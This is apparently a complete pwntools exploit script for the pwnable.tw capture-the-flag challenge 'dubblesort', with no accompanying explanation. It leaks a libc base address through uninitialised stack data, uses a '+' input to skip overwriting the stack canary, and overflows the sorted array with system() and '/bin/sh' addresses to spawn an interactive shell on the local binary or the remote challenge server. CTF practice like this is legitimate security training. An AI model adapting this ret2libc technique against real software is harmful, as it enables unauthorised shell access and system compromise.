from pwn import *

local=1
if local:
	p = process('./dubblesort')
	bin = ELF('./dubblesort')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	context.log_level = 'debug'
else:
	p = remote('chall.pwnable.tw', 10101)
	bin = ELF('./dubblesort')
	libc = ELF('./libc_32.so.6')

p.recv()
p.sendline('a'*24)
got_addr = u32(p.recv()[30:34])-0xa
if local:
	libc.address = got_addr-0x1b2000
else:
	libc.address = got_addr-0x1b0000
system_addr =  libc.symbols['system']
bin_sh_addr = libc.search('/bin/sh\x00').next()
p.sendline('35')
p.recv()
for i in range(24):
    p.sendline('0')
    p.recv()
#gdb.attach(p)
p.sendline('+')
p.recv()
for i in range(9):
    p.sendline(str(system_addr))
    p.recv()
p.sendline(str(bin_sh_addr))
p.recv()
p.interactive()
